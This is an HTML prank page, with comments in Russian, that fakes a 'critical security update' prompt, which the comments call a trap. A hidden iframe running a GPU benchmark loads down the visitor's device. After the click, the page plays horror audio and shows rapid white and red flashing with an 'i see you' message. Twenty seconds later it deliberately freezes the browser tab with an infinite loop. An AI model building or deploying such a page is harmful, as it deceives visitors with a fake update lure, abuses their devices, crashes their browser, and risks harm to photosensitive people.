<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<title>System Security</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-user-select: none; -webkit-touch-callout: none; }
  html, body { background: #000; overflow: hidden; font-family: 'Courier New', monospace; height: 100vh; width: 100vw; color: #fff; position: fixed; top: 0; left: 0; right: 0; bottom: 0; touch-action: none; overscroll-behavior: none; }

  /* CZNULL (Скрытый, грузит телефон) */
  #stress-layer { position: fixed; inset: 0; width: 100vw; height: 100vh; z-index: -1; border: none; opacity: 0.05; pointer-events: none; }

  /* ЭТАП 1: ЛОВУШКА */
  #trap-screen { position: fixed; inset: 0; background: #f0f0f0; z-index: 99999; display: flex; justify-content: center; align-items: center; flex-direction: column; color: #000; font-family: sans-serif; }
  .alert-box { background: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); text-align: center; width: 80%; max-width: 300px; }
  .alert-box h3 { margin-bottom: 10px; font-size: 16px; }
  .alert-box p { font-size: 12px; color: #666; margin-bottom: 20px; }
  #start-btn { background: #007aff; color: #fff; border: none; padding: 10px 20px; border-radius: 5px; font-size: 14px; font-weight: bold; width: 100%; cursor: pointer; }

  /* ЭТАП 2: ХАОС */
  #horror-screen { display: none; position: fixed; inset: 0; z-index: 100; background: #000; }
  
  /* Шум (Статика) */
  #noise-layer {
    position: fixed; inset: 0; z-index: 50; pointer-events: none;
    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E");
    opacity: 0.15; mix-blend-mode: overlay; animation: noiseAnim 0.1s infinite;
  }
  @keyframes noiseAnim { 0% { transform: translate(0,0); } 50% { transform: translate(-10%,10%); } 100% { transform: translate(10%,-10%); } }

  /* ГЛАВНЫЙ ТЕКСТ */
  #main-text {
    position: fixed; top: 50%; left: 50%;
    transform: translate(-50%, -50%);
    color: #fff; font-family: 'Times New Roman', serif;
    font-size: 60px; font-weight: bold; text-transform: lowercase;
    text-shadow: 0 0 20px rgba(255,255,255,0.5);
    z-index: 100; letter-spacing: 5px; pointer-events: none;
  }

  /* Вспышки */
  #flash { position: fixed; inset: 0; background: #fff; opacity: 0; pointer-events: none; z-index: 999; mix-blend-mode: difference; }
  #red-flash { position: fixed; inset: 0; background: #800; opacity: 0; pointer-events: none; z-index: 998; mix-blend-mode: multiply; }

  .shaking { animation: shake 0.05s infinite; }
  @keyframes shake { 
    0% { transform: translate(0, 0); } 20% { transform: translate(-10px, 5px) rotate(-1deg); } 
    40% { transform: translate(10px, -5px) rotate(1deg); } 60% { transform: translate(-5px, -5px) rotate(0deg); } 
    80% { transform: translate(5px, 5px) rotate(1deg); } 100% { transform: translate(0, 0); } 
  }
</style>
</head>
<body>

<!-- CZNULL (Грузит телефон) -->
<iframe id="stress-layer" src="https://cznull.github.io/vsbm" sandbox="allow-scripts allow-same-origin"></iframe>

<!-- ТВОИ ЗВУКИ С CATBOX -->
<audio id="sound-rain" loop>
    <source src="https://files.catbox.moe/9hki7n.mp3" type="audio/mpeg">
</audio>
<audio id="sound-swing" loop>
    <source src="https://files.catbox.moe/x4hwx0.mp3" type="audio/mpeg">
</audio>
<audio id="sound-metal">
    <source src="https://files.catbox.moe/avk4fs.mp3" type="audio/mpeg">
</audio>
<audio id="sound-extra">
    <source src="https://files.catbox.moe/ajdhkc.mp3" type="audio/mpeg">
</audio>

<!-- ЛОВУШКА -->
<div id="trap-screen">
  <div class="alert-box">
    <h3>Обновление безопасности</h3>
    <p>Установка критического патча...</p>
    <button id="start-btn">УСТАНОВИТЬ</button>
  </div>
</div>

<!-- ЭКРАН УЖАСА -->
<div id="horror-screen">
  <div id="noise-layer"></div>
  <div id="main-text">i see you</div>
</div>

<div id="flash"></div>
<div id="red-flash"></div>

<script>
const trapScreen = document.getElementById('trap-screen');
const horrorScreen = document.getElementById('horror-screen');
const startBtn = document.getElementById('start-btn');

// Получаем аудио-элементы
const audioRain = document.getElementById('sound-rain');
const audioSwing = document.getElementById('sound-swing');
const audioMetal = document.getElementById('sound-metal');
const audioExtra = document.getElementById('sound-extra');

startBtn.addEventListener('click', () => {
    // Настраиваем громкость (можешь подкрутить под себя)
    audioRain.volume = 0.5;   // Фон
    audioSwing.volume = 0.3;  // Качели
    audioMetal.volume = 0.7;  // Скрежет
    audioExtra.volume = 0.4;  // Доп. слой

    // Запускаем фоновые звуки
    audioRain.play().catch(e => console.log("Аудио заблокировано", e));
    audioSwing.play().catch(e => console.log("Аудио заблокировано", e));
    audioExtra.play().catch(e => console.log("Аудио заблокировано", e));
    
    // Запускаем случайный скрежет металла
    setInterval(() => {
        if (Math.random() > 0.5) { // 50% шанс каждые 2 секунды
            audioMetal.currentTime = 0;
            audioMetal.play().catch(e => {});
        }
    }, 2000);

    // Переключаем экран
    trapScreen.style.display = 'none';
    horrorScreen.style.display = 'block';
    document.body.classList.add('shaking');

    startGlitchEffects();
    
    // Через 20 секунд - КРАШ БРАУЗЕРА
    setTimeout(triggerCrash, 20000);
});

function startGlitchEffects() {
    const flash = document.getElementById('flash');
    const redFlash = document.getElementById('red-flash');

    setInterval(() => {
        if (Math.random() > 0.8) {
            flash.style.opacity = '1';
            setTimeout(() => flash.style.opacity = '0', 30);
        }
        if (Math.random() > 0.7) {
            redFlash.style.opacity = '0.6';
            setTimeout(() => redFlash.style.opacity = '0', 50);
        }
    }, 200);
}

function triggerCrash() {
    // Останавливаем все звуки
    audioRain.pause();
    audioSwing.pause();
    audioMetal.pause();
    audioExtra.pause();
    
    horrorScreen.style.display = 'none';
    document.body.style.background = '#000';
    document.body.innerHTML = '<h1 style="color:#fff; text-align:center; margin-top:40vh; font-family:serif;">i see you</h1>';

    setTimeout(() => {
        const stress = document.getElementById('stress-layer');
        if(stress) stress.remove();
        // Бесконечный цикл -> Chrome убивает вкладку ("Опаньки")
        while(true) {}
    }, 2000);
}
</script>
</body>
</html>
